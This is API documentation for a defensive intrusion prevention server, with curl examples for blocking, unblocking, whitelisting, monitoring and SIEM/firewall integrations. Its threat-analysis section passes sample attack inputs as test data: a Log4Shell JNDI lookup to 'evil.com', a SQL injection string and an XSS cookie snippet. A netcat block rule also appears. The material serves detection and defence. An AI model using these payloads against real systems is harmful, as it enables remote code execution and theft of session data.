# SOC4 IPS Server — API Examples v3.0

> Base URL: `http://localhost:5050`  
> Auth header (if secret configured): `X-Webhook-Secret: <your-secret>`

---

## 🔥 Block by IP

### Block IP (Inbound only)
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "ip": "203.0.113.45",
    "direction": "inbound",
    "reason": "SSH brute force attack"
  }'
```

### Block IP (Outbound only — stop C2 beacon)
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "ip": "185.220.101.47",
    "direction": "outbound",
    "reason": "Known Tor exit node C2"
  }'
```

### Block IP + Port + Protocol (Bidirectional)
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "ip": "203.0.113.45",
    "port": 22,
    "protocol": "tcp",
    "direction": "inbound",
    "reason": "SSH brute force"
  }'
```

### Block IP with Attack Type (Threat classification)
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "ip": "192.0.2.100",
    "port": 3306,
    "protocol": "tcp",
    "direction": "inbound",
    "attackType": "SQL Injection",
    "reason": "SQL injection attempt on database"
  }'
```

### Block IP CIDR range
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "ip": "10.0.0.0/8",
    "direction": "both",
    "reason": "Block entire RFC1918 range"
  }'
```

---

## 🌐 Domain Blocking

### Block domain (outbound)
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "domain": "malware-c2.ru",
    "direction": "outbound",
    "reason": "Known C2 domain"
  }'
```

### Block streaming site
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "domain": "youtube.com",
    "direction": "outbound",
    "reason": "Block streaming during work hours"
  }'
```

---

## 🔌 Port Blocking

### Block single port
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "port": 22,
    "protocol": "tcp",
    "direction": "inbound",
    "reason": "Block SSH from internet"
  }'
```

### Block port range (8000–9000)
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "port": "8000-9000",
    "protocol": "tcp",
    "direction": "both",
    "reason": "Close development port range"
  }'
```

### Block RDP port
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "port": 3389,
    "protocol": "tcp",
    "direction": "inbound",
    "reason": "Block internet RDP"
  }'
```

---

## 📡 Protocol Blocking

### Block ICMP (stop ping sweeps)
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "protocol": "icmp",
    "direction": "inbound",
    "reason": "Block ICMP ping sweeps"
  }'
```

### Block UDP (inbound)
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "protocol": "udp",
    "direction": "inbound",
    "reason": "Stop UDP flood"
  }'
```

### Block ALL protocols (emergency)
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "protocol": "all",
    "ip": "203.0.113.0/24",
    "direction": "both",
    "reason": "Emergency: block attacking CIDR"
  }'
```

---

## 🖥️ Application Blocking

### Block torrent application
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "application": "torrent",
    "direction": "outbound",
    "reason": "Block peer-to-peer traffic"
  }'
```

### Block by process name
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "application": "nc",
    "direction": "both",
    "reason": "Block netcat (potential backdoor)"
  }'
```

---

## 🧠 Attack Detection (Auto-classify)

### Classify threat with factors
```bash
curl -X POST http://localhost:5050/analyze \
  -H "Content-Type: application/json" \
  -d '{
    "ip": "203.0.113.5",
    "failedAttempts": 12,
    "requestsPerSecond": 500,
    "payload": "SELECT * FROM users WHERE id=1 OR 1=1",
    "ipReputation": "malicious"
  }'
```

**Response:**
```json
{
  "ok": true,
  "ip": "203.0.113.5",
  "detection": {
    "type": "SQL Injection",
    "key": "SQL_INJECTION",
    "patterns": ["/union\\s+(all\\s+)?select/i"]
  },
  "threat": {
    "threatLevel": "critical",
    "attackType": "SQL Injection",
    "confidence": { "sql_injection": 95, "ddos": 100 },
    "score": 100,
    "recommendedAction": ["block_ip", "alert_soc", "log_forensics", "isolate_system"]
  }
}
```

### Check Log4Shell payload
```bash
curl -X POST http://localhost:5050/analyze \
  -H "Content-Type: application/json" \
  -d '{
    "ip": "10.0.0.50",
    "payload": "${jndi:ldap://evil.com/exploit}"
  }'
```

### Check XSS payload
```bash
curl -X POST http://localhost:5050/analyze \
  -H "Content-Type: application/json" \
  -d '{
    "payload": "<script>document.cookie</script>"
  }'
```

---

## ↩️ Unblock

### Unblock IP
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "unblock",
    "ip": "203.0.113.45",
    "direction": "inbound"
  }'
```

### Unblock domain
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "unblock",
    "domain": "youtube.com",
    "direction": "outbound"
  }'
```

### Unblock port
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "unblock",
    "port": 22,
    "protocol": "tcp",
    "direction": "inbound"
  }'
```

---

## 📋 Status & Monitoring

### Server status + blocklist
```bash
curl http://localhost:5050/status
```

### Health check (liveness probe)
```bash
curl http://localhost:5050/health
```

### Active blocklist
```bash
curl http://localhost:5050/blocklist
```

### Threat statistics (last 24h)
```bash
curl "http://localhost:5050/threats?hours=24"
```

### Threat statistics (last 1h)
```bash
curl "http://localhost:5050/threats?hours=1"
```

### Recent attack events
```bash
curl "http://localhost:5050/attacks?limit=50"
```

### Server logs (blocks only)
```bash
curl "http://localhost:5050/logs?level=BLOCK&limit=100"
```

### Server logs (errors only)
```bash
curl "http://localhost:5050/logs?level=ERROR"
```

---

## 🛡️ Whitelist Management

### View whitelist
```bash
curl http://localhost:5050/whitelist
```

### Add IP to whitelist (prevents blocking)
```bash
curl -X POST http://localhost:5050/whitelist \
  -H "Content-Type: application/json" \
  -d '{
    "value": "192.168.1.100",
    "type": "ip",
    "reason": "Admin workstation — never block"
  }'
```

### Add domain to whitelist
```bash
curl -X POST http://localhost:5050/whitelist \
  -H "Content-Type: application/json" \
  -d '{
    "value": "company.com",
    "type": "domain",
    "reason": "Internal domain"
  }'
```

### Remove from whitelist
```bash
curl -X DELETE http://localhost:5050/whitelist/192.168.1.100
```

---

## ⚡ Integrations

### From Suricata (eve.json alert)
```bash
# Auto-block Suricata alert source IP
jq -r 'select(.event_type=="alert") | .src_ip' /var/log/suricata/eve.json | \
while read ip; do
  curl -X POST http://localhost:5050/webhook \
    -H "Content-Type: application/json" \
    -d "{\"action\":\"block\",\"ip\":\"$ip\",\"direction\":\"inbound\",\"reason\":\"Suricata IDS alert\"}"
done
```

### From FortiGate Syslog
```bash
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -H "X-Webhook-Secret: $IPS_WEBHOOK_SECRET" \
  -d '{
    "action": "block",
    "ip": "1.2.3.4",
    "protocol": "tcp",
    "port": 80,
    "attackType": "Web Application Attack",
    "reason": "FortiGate UTM signature match"
  }'
```

### From pfSense / OPNsense
```bash
# pfSense can POST to the webhook via pfBlockerNG or shell command
curl -X POST http://localhost:5050/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "action": "block",
    "ip": "1.2.3.4",
    "direction": "both",
    "reason": "Blocked by pfBlockerNG IOC feed"
  }'
```

### From SOC4 Dashboard (backend firewall.routes.js)
```bash
# Automatically triggered when admin creates a firewall rule
# Direction, protocol, and all conditions are included
curl -X POST http://your-ips-server:5050/webhook \
  -H "Content-Type: application/json" \
  -H "X-Webhook-Secret: $IPS_WEBHOOK_SECRET" \
  -d '{
    "action": "block",
    "domain": "malicious.com",
    "protocol": "tcp",
    "direction": "outbound",
    "reason": "[company] Block Malicious Domain: rule from SOC4 dashboard"
  }'
```

---

## ❌ Error Responses

### Missing action
```json
{ "ok": false, "error": "action is required (block or unblock)" }
```

### Invalid action
```json
{ "ok": false, "error": "Invalid action. Use: block or unblock" }
```

### No criteria
```json
{ "ok": false, "error": "At least one of: ip, domain, application, port, or protocol is required" }
```

### Invalid IP
```json
{ "ok": false, "error": "Invalid IP address: not-an-ip" }
```

### Invalid port
```json
{ "ok": false, "error": "Invalid port: 99999" }
```

### Whitelisted IP
```json
{
  "ok": true,
  "action": "block",
  "skipped": true,
  "reason": "IP is whitelisted",
  "ip": "192.168.1.100"
}
```

---

## 📊 Threat Level Reference

| Level | Score | Trigger | Auto-Actions |
|-------|-------|---------|--------------|
| `low` | 0–29 | Unknown | monitor, log |
| `medium` | 30–54 | Low confidence | rate_limit, log |
| `high` | 55–79 | Brute force / injection | block_ip, rate_limit, alert |
| `critical` | 80–100 | DDoS / malicious IP | block_ip, alert_soc, forensics, isolate |

## 🔍 Attack Type Detection Reference

| Attack Type | Detection Method |
|------------|-----------------|
| SQL Injection | 18 regex patterns (union select, drop table, etc.) |
| XSS | 15 regex patterns (script tags, event handlers) |
| Command Injection | Shell metacharacters + exec/system keywords |
| Path Traversal | `../` sequences, `/etc/passwd`, Windows paths |
| SSRF | Localhost/internal IPs in URL parameters |
| Log4Shell | `${jndi:...}` patterns + obfuscated variants |
| Web Shell | c99/r57/b374k patterns, base64 eval |
| Credential Theft | API keys, bearer tokens, private key patterns |
| Data Exfiltration | base64 image data, Content-Disposition |
| DNS Tunneling | Abnormally long subdomain labels |
| Malware | EICAR signature + PE header detection |
| Brute Force | Failed attempts count threshold |
| DDoS | Requests/second threshold |
| Botnet | IP reputation (malicious/botnet flag) |
| Port Scan | Distinct port count threshold |
